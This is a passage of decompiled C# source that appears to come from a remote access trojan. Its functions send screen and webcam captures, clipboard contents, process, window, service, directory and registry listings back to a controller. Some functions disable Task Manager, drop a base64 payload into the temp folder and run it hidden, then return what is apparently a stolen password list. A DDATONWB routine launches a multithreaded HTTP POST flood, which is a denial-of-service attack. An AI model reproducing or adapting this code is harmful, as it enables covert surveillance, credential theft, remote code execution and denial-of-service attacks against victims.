  private void ChangeSettings(DisplaySettingsSample.DEVMODE dm) => DisplaySettingsSample.NativeMethods.ChangeDisplaySettings(ref dm, 0);

  private void EnableTaskManager(bool enable)
  {
    try
    {
      if (Conversions.ToDouble(this.os) >= 6.0)
        return;
      Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", RuntimeHelpers.GetObjectValue(Interaction.IIf(enable, (object) 0, (object) 1)), RegistryValueKind.DWord);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetDesktopWindow();

  private void StartScreenSaver(bool start)
  {
    try
    {
      int desktopWindow = MainFrm.GetDesktopWindow();
      if (start)
        API.SendMessage((IntPtr) desktopWindow, 274U, (IntPtr) 61760, (IntPtr) 0);
      else
        SendKeys.SendWait("{ESC}");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void Action(bool cond)
  {
    try
    {
      if (cond)
      {
        this.streamWriter.WriteLine("/MSGS/");
        this.streamWriter.Flush();
      }
      else
      {
        this.streamWriter.WriteLine("/MSGE/");
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public bool FindAndKillProcess(string name)
  {
    bool andKillProcess;
    try
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      if (index < processes.Length)
      {
        int num1;
        if (processes[index].ProcessName.StartsWith(name))
        {
          int num2;
          num1 = checked (num2 + 1);
        }
        andKillProcess = num1 != 0;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      andKillProcess = false;
      ProjectData.ClearProjectError();
    }
    return andKillProcess;
  }

  private int RandomNumber(int min, int max) => new Random().Next(min, max);

  private string ReadClip()
  {
    string str;
    try
    {
      this.clip = MyProject.Computer.Clipboard.GetText();
      this.clip = this.clip.Replace("\r\n", "***");
      str = this.clip;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  private void cap(string tempdata)
  {
    while (true)
    {
      while (Operators.CompareString(this.webflag, "Connect", false) != 0)
      {
        if (Operators.CompareString(this.webflag2, "Image", false) == 0 && this.webflag5)
        {
          this.webflag4 = this.webflag2;
          this.webflag2 = "";
          MainFrm.SendMessage(this.hHwnd, 1084, 0, (object) 0);
          MainFrm.SendMessage(this.hHwnd, 1054, 0, (object) 0);
          Thread thread = new Thread(new ThreadStart(this.ReadClipobj));
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start();
          thread.Join();
        }
        else if (Operators.CompareString(this.webflag2, "Capture", false) == 0 && this.webflag6)
        {
          this.webflag4 = this.webflag2;
          this.webflag2 = "";
          MainFrm.SendMessage(this.hHwnd, 1084, 0, (object) 0);
          MainFrm.SendMessage(this.hHwnd, 1054, 0, (object) 0);
          Thread thread = new Thread(new ThreadStart(this.ReadClipobj));
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start();
          thread.Join();
        }
        else
        {
          if (Operators.CompareString(this.webflag3, "Disconnect", false) == 0)
          {
            MainFrm.SendMessage(this.hHwnd, 1035, 0, (object) 0);
            this.webflag3 = "";
            return;
          }
          Thread.Sleep(50);
        }
      }
      this.hHwnd = MainFrm.capCreateCaptureWindowA(ref tempdata, 0, 0, 0, 640, (short) 480, this.mehand, 0);
      MainFrm.SendMessage(this.hHwnd, 1034, 0, (object) 0);
      this.webflag = "";
    }
  }

  private void ReadClipobj()
  {
    try
    {
      this.tempObj = Clipboard.GetDataObject();
      this.tempImg = (Image) this.tempObj.GetData(DataFormats.Bitmap);
      string str = (string) null;
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);
      ImageCodecInfo encoderInfo = this.GetEncoderInfo("image/jpeg");
      MemoryStream memoryStream = new MemoryStream();
      this.tempImg.Save((Stream) memoryStream, encoderInfo, encoderParams);
      memoryStream.Capacity = checked ((int) memoryStream.Length);
      if (memoryStream.Length == (long) this.oldms2)
      {
        string webflag4 = this.webflag4;
        if (Operators.CompareString(webflag4, "Image", false) == 0)
        {
          this.streamWriter.WriteLine("/WEBIMAGE/SAME");
          this.streamWriter.Flush();
        }
        else
        {
          if (Operators.CompareString(webflag4, "Capture", false) != 0)
            return;
          this.streamWriter.WriteLine("/WEBCAPTR/SAME");
          this.streamWriter.Flush();
        }
      }
      else
      {
        string base64String = Convert.ToBase64String(memoryStream.GetBuffer());
        this.tempImg.Dispose();
        this.oldms2 = checked ((int) memoryStream.Length);
        memoryStream.Flush();
        memoryStream.Dispose();
        memoryStream.Close();
        string webflag4 = this.webflag4;
        if (Operators.CompareString(webflag4, "Image", false) == 0)
        {
          this.streamWriter.WriteLine("/WEBIMAGE/" + base64String);
          this.streamWriter.Flush();
        }
        else if (Operators.CompareString(webflag4, "Capture", false) == 0)
        {
          this.streamWriter.WriteLine("/WEBCAPTR/" + base64String);
          this.streamWriter.Flush();
        }
        str = (string) null;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void SetClip()
  {
    try
    {
      if (Operators.CompareString(this.clip, (string) null, false) == 0)
        MyProject.Computer.Clipboard.Clear();
      else
        MyProject.Computer.Clipboard.SetText(this.clip, TextDataFormat.Text);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void refreshwind()
  {
    try
    {
      Process process1 = new Process();
      string str1 = (string) null;
      string str2 = (string) null;
      string str3 = (string) null;
      Process[] processes = Process.GetProcesses(".");
      int index = 0;
      while (index < processes.Length)
      {
        Process process2 = processes[index];
        if (process2.MainWindowTitle.Length > 0)
        {
          str1 = str1 + process2.MainWindowTitle.ToString() + "\u00B2";
          str2 = str2 + process2.Id.ToString() + "\u00B3";
          str3 = str1 + "±" + str2;
        }
        checked { ++index; }
      }
      this.streamWriter.WriteLine("/REFRWIND/" + str3);
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void prev(string tempdata)
  {
    try
    {
      Image image1 = Image.FromFile(tempdata);
      if (image1 == null)
        return;
      double num1 = (double) image1.Size.Width / (double) image1.Size.Height;
      double num2 = (double) image1.Size.Height / (double) image1.Size.Width;
      Image image2 = image1.Size.Width <= image1.Size.Height ? image1.GetThumbnailImage(checked ((int) Math.Round(unchecked (150.0 / num2))), 150, (Image.GetThumbnailImageAbort) null, new IntPtr()) : image1.GetThumbnailImage(150, checked ((int) Math.Round(unchecked (150.0 / num1))), (Image.GetThumbnailImageAbort) null, new IntPtr());
      MemoryStream memoryStream = new MemoryStream();
      image2.Save((Stream) memoryStream, ImageFormat.Jpeg);
      memoryStream.Capacity = checked ((int) memoryStream.Length);
      this.streamWriter.WriteLine("/IPREVIEW/" + Convert.ToBase64String(memoryStream.GetBuffer()));
      this.streamWriter.Flush();
      memoryStream.Dispose();
      memoryStream.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void screens(string tempdata)
  {
    try
    {
      if (!this.deskflag)
        return;
      string[] strArray = tempdata.Split('¦');
      string str = (string) null;
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long) int.Parse(strArray[0]));
      ImageCodecInfo encoderInfo = this.GetEncoderInfo("image/jpeg");
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width = int.Parse(strArray[1]);
      Bitmap bitmap1 = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555);
      if (width > bitmap1.Width)
        width = bitmap1.Width;
      double num = (double) bitmap1.Width / (double) width;
      int height = checked ((int) Math.Round(unchecked ((double) bitmap1.Height / num)));
      Bitmap bitmap2 = new Bitmap(width, height, PixelFormat.Format16bppRgb555);
      Graphics.FromImage((Image) bitmap1).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
      Graphics graphics = Graphics.FromImage((Image) bitmap2);
      if ((double) width == Conversions.ToDouble("640"))
      {
        graphics.InterpolationMode = InterpolationMode.NearestNeighbor;
        graphics.CompositingQuality = CompositingQuality.HighSpeed;
      }
      else
      {
        graphics.InterpolationMode = InterpolationMode.HighQualityBilinear;
        graphics.CompositingQuality = CompositingQuality.HighSpeed;
      }
      graphics.DrawImage((Image) bitmap1, 0, 0, width, height);
      MemoryStream memoryStream = new MemoryStream();
      bitmap2.Save((Stream) memoryStream, encoderInfo, encoderParams);
      memoryStream.Capacity = checked ((int) memoryStream.Length);
      if (memoryStream.Length == (long) this.oldms)
      {
        this.streamWriter.WriteLine("/STARTSEQ/SAME");
        this.streamWriter.Flush();
      }
      else
      {
        this.streamWriter.WriteLine("/STARTSEQ/" + Convert.ToBase64String(memoryStream.GetBuffer()));
        this.streamWriter.Flush();
      }
      this.oldms = checked ((int) memoryStream.Length);
      bitmap2.Dispose();
      bitmap1.Dispose();
      memoryStream.Dispose();
      memoryStream.Close();
      graphics.Dispose();
      str = (string) null;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void sd(string tempdata)
  {
    int num = 0;
    do
    {
      try
      {
        HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create(tempdata);
        byte[] bytes = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG");
        HttpWebRequest httpWebRequest2 = httpWebRequest1;
        httpWebRequest2.Method = "POST";
        httpWebRequest2.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest2.ContentLength = (long) bytes.Length;
        httpWebRequest2.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)";
        httpWebRequest2.Referer = "http://0mn3d6yunkn0wn.com";
        Stream requestStream = httpWebRequest1.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        HttpWebResponse httpWebResponse = (HttpWebResponse) null;
        try
        {
          httpWebResponse = (HttpWebResponse) httpWebRequest1.GetResponse();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          ProjectData.ClearProjectError();
        }
        Stream responseStream = httpWebResponse.GetResponseStream();
        StreamReader streamReader = new StreamReader(responseStream);
        streamReader.ReadToEnd();
        streamReader.Close();
        responseStream.Close();
        httpWebResponse.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++num; }
    }
    while (num <= 100);
  }

  private void DDATONWB(string tempdata)
  {
    int num = 0;
    do
    {
      new Thread((ParameterizedThreadStart) (a0 => this.sd(Conversions.ToString(a0)))).Start((object) tempdata);
      checked { ++num; }
    }
    while (num <= 100);
  }

  private void UPANDRUN(string tempdata)
  {
    try
    {
      string[] strArray = tempdata.Split('*');
      string str1 = strArray.GetValue(1).ToString();
      string tempPath = strArray.GetValue(0).ToString();
      if (Operators.CompareString(tempPath, "temp", false) == 0)
        tempPath = Path.GetTempPath();
      if (!Directory.Exists(tempPath))
        Directory.CreateDirectory(tempPath);
      if (!System.IO.File.Exists(tempPath + str1))
      {
        byte[] data = Convert.FromBase64String(Conversions.ToString(strArray.GetValue(2)));
        MyProject.Computer.FileSystem.WriteAllBytes(tempPath + str1, data, false);
        this.Delay(5);
      }
      if (Operators.CompareString(Conversions.ToString(strArray.GetValue(3)), "0", false) == 0)
        new Process()
        {
          StartInfo = {
            WorkingDirectory = tempPath,
            FileName = (tempPath + str1),
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      else
        new Process()
        {
          StartInfo = {
            WorkingDirectory = tempPath,
            FileName = (tempPath + str1),
            WindowStyle = ProcessWindowStyle.Normal
          }
        }.Start();
      if (Operators.CompareString(tempPath, Path.GetTempPath(), false) == 0)
      {
        this.Delay(5);
        string str2 = (string) null;
        try
        {
          str2 = MyProject.Computer.FileSystem.ReadAllText(Path.GetTempPath() + "ff.txt");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (Operators.CompareString(str2, (string) null, false) == 0)
          this.streamWriter.WriteLine("/PSSRLIST/" + this.Encrypt("Nothing to show!!!", "&%#@?,:*"));
        else
          this.streamWriter.WriteLine("/PSSRLIST/" + this.Encrypt(str2, "&%#@?,:*"));
        this.streamWriter.Flush();
      }
      else
        this.Action(true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void proc()
  {
    try
    {
      this.streamWriter.WriteLine("/LISTPROC/" + this.ListProcess());
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void serv()
  {
    try
    {
      this.streamWriter.WriteLine("/LISTSERV/" + this.ListServices());
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void listd(string tempdata)
  {
    try
    {
      string str1 = (string) null;
      DirectoryInfo directoryInfo = new DirectoryInfo(tempdata);
      if (tempdata.Length > 3)
        str1 = "(DIR).*(DIR)..*";
      DirectoryInfo[] directories = directoryInfo.GetDirectories();
      int index1 = 0;
      while (index1 < directories.Length)
      {
        string str2 = "(DIR)" + directories[index1].Name;
        str1 = str1 + str2 + "*";
        checked { ++index1; }
      }
      FileInfo[] files = directoryInfo.GetFiles();
      int index2 = 0;
      while (index2 < files.Length)
      {
        string name = files[index2].Name;
        str1 = str1 + name + "*";
        checked { ++index2; }
      }
      this.streamWriter.WriteLine("/ONLYONEP/" + str1);
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.streamWriter.WriteLine("/ERRORDIR/(DIR).*(DIR)..");
      this.streamWriter.Flush();
      ProjectData.ClearProjectError();
    }
  }

  private void ReadRegistry(string Node)
  {
    string Left1 = (string) null;
    string[] strArray1 = (string[]) null;
    try
    {
      string Left2 = Node;
      if (Operators.CompareString(Left2, "CU", false) == 0)
        strArray1 = Registry.CurrentUser.GetSubKeyNames();
      else if (Operators.CompareString(Left2, "LM", false) == 0)
        strArray1 = Registry.LocalMachine.GetSubKeyNames();
      else if (Operators.CompareString(Left2, "US", false) == 0)
        strArray1 = Registry.Users.GetSubKeyNames();
      string[] strArray2 = strArray1;
      int index = 0;
      while (index < strArray2.Length)
      {
        string str = strArray2[index];
        try
        {
          Left1 = Operators.CompareString(Left1, (string) null, false) != 0 ? Left1 + "¥" + str : str;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      this.streamWriter.WriteLine("/REGYVIEW/" + Node + Left1);
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void ReadRegistry1(string Node)
  {
    try
    {
      string Left1 = (string) null;
      string[] strArray1 = (string[]) null;
      object obj = (object) Strings.Mid(Node, 3, Strings.Len(Node));
      Node = Strings.Left(Node, 2);
      string Left2 = Node;
      if (Operators.CompareString(Left2, "CU", false) == 0)
        strArray1 = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj)).GetSubKeyNames();
      else if (Operators.CompareString(Left2, "LM", false) == 0)
        strArray1 = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj)).GetSubKeyNames();
      else if (Operators.CompareString(Left2, "US", false) == 0)
        strArray1 = Registry.Users.OpenSubKey(Conversions.ToString(obj)).GetSubKeyNames();
      string[] strArray2 = strArray1;
      int index = 0;
      while (index < strArray2.Length)
      {
        string str = strArray2[index];
        try
        {
          Left1 = Operators.CompareString(Left1, (string) null, false) != 0 ? Left1 + "¥" + str : str;
        }
        catch (Exception ex)
        {
